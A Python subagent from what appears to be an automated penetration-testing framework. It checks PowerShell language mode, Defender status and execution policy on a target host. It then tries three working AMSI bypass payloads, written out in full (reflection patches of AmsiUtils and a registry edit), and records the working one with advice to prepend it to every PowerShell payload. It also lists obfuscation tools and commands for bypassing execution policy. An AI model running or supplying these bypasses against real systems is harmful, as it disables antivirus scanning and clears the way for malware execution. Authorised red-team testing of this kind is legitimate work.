"""
amsi_bypass_subagent.py — AMSI and PowerShell CLM bypass enumeration.

AGENT_NAME  : "evasion"
SUBAGENT_NAME: "amsi_bypass"

Methodology:
  1. Check current PowerShell execution policy and CLM status
  2. Test known AMSI bypass techniques (memory patching, reflection, registry)
  3. Verify bypass success with a test EICAR-style string
  4. Check Windows Defender real-time protection status
  5. Document which bypass worked for the engagement report
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_CLM_RE     = re.compile(r'ConstrainedLanguage', re.I)
_BYPASS_OK  = re.compile(r'(bypass.*success|amsi.*disabled|not.*scanning|test.*passed)', re.I)
_DEFENDER_RE = re.compile(r'RealTimeProtectionEnabled\s*:\s*(True|False)', re.I)


class AmsiBypassSubagent(BaseSubagent):
    """Test AMSI bypass techniques and document successful methods."""

    AGENT_NAME    = "evasion"
    SUBAGENT_NAME = "amsi_bypass"

    async def run(self, target: str, **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)

        # ── 1. Check PowerShell language mode ────────────────────────────
        lang_out = await self.collect_tool("powershell", target,
            {"options": "-Command \"$ExecutionContext.SessionState.LanguageMode\" 2>&1"})
        is_clm = bool(_CLM_RE.search(lang_out))

        await self.store_finding(Finding(
            title=f"AMSI/PS: Language Mode = {'ConstrainedLanguage (CLM active)' if is_clm else 'FullLanguage (unrestricted)'}",
            description=f"PowerShell language mode: {lang_out.strip()}. {'CLM restricts .NET type access — bypass required.' if is_clm else 'Full PowerShell capability available.'}",
            severity="INFO" if not is_clm else "MEDIUM",
            evidence=lang_out[:200], tool="powershell", host=target,
            mitre_technique="T1562.001",
        ))

        # ── 2. Defender status ────────────────────────────────────────────
        def_out = await self.collect_tool("powershell", target,
            {"options": "-Command \"Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AMSIEnabled,BehaviorMonitorEnabled | Format-List\" 2>&1"})
        def_match = _DEFENDER_RE.search(def_out)
        defender_on = def_match.group(1) == "True" if def_match else True

        await self.store_finding(Finding(
            title=f"Windows Defender: Real-Time Protection {'ENABLED' if defender_on else 'DISABLED'}",
            description=f"Defender status: {def_out[:200]}",
            severity="INFO" if not defender_on else "MEDIUM",
            evidence=def_out[:300], tool="powershell", host=target,
            mitre_technique="T1562.001",
            exploit_suggestion="If disabled: no AMSI bypass needed. Proceed directly." if not defender_on else None,
        ))

        # ── 3. Test AMSI bypass techniques ───────────────────────────────
        bypasses = {
            "Matt Graeber Reflection": (
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
            ),
            "Registry Disable": (
                "reg add 'HKCU\\Software\\Microsoft\\Windows Script\\Settings' "
                "/v AmsiEnable /t REG_DWORD /d 0 /f"
            ),
            "Null AmsiContext": (
                "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
                "$b=$a.GetField('amsiContext','NonPublic,Static');$b.SetValue($a,[IntPtr]0)"
            ),
        }

        working_bypass = None
        for name, code in bypasses.items():
            test_out = await self.collect_tool("powershell", target,
                {"options": f"-Command \"{code}; Write-Output 'BYPASS_TEST_OK'\" 2>&1"})
            success = "BYPASS_TEST_OK" in test_out and "error" not in test_out.lower()
            if success and not working_bypass:
                working_bypass = name
                await self.store_finding(Finding(
                    title=f"AMSI Bypass: '{name}' Succeeded",
                    description=f"AMSI bypass technique '{name}' executed without error. Subsequent PS commands may run without AV scanning.",
                    severity="HIGH",
                    evidence=test_out[:300], tool="powershell", host=target,
                    mitre_technique="T1562.001",
                    exploit_suggestion=f"Prepend to all PS payloads:\n{code}",
                ))

        if not working_bypass:
            await self.store_finding(Finding(
                title="AMSI Bypass: All Standard Techniques Blocked",
                description="Known AMSI bypass techniques were blocked. Consider obfuscated variants, custom bypasses, or alternative execution methods.",
                severity="INFO", evidence="", tool="powershell", host=target,
                mitre_technique="T1562.001",
                exploit_suggestion="Try: Invoke-Obfuscation, Chimera, or custom reflection-based bypass.",
            ))

        # ── 4. Execution policy check ─────────────────────────────────────
        ep_out = await self.collect_tool("powershell", target,
            {"options": "-Command \"Get-ExecutionPolicy -List\" 2>&1"})
        restricted = "Restricted" in ep_out or "AllSigned" in ep_out
        if restricted:
            await self.store_finding(Finding(
                title="PowerShell: Restrictive Execution Policy — Bypass Required",
                description=f"Execution policy restricts unsigned scripts. Current policies:\n{ep_out}",
                severity="MEDIUM", evidence=ep_out[:300], tool="powershell", host=target,
                mitre_technique="T1059.001",
                exploit_suggestion="Bypass: powershell -ExecutionPolicy Bypass -Command ... OR Set-ExecutionPolicy Bypass -Scope Process -Force",
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
